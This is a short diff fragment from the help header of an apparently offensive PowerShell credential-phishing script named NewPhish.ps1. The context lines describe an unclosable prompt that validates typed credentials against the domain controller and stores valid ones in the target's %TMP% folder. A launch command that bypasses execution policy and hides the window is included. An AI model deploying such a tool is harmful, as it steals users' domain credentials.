@@ -12,7 +12,6 @@
    The box cannot be closed (only by killing the process) and it keeps checking the credentials against the DC.
    If its valid, it will leak it via one remote logfile stored on target %TMP% folder to be retrieved later.
 
-
 .EXECUTION
    powershell.exe -exec bypass -w 1 -noninteractive -nologo -file "NewPhish.ps1"
  
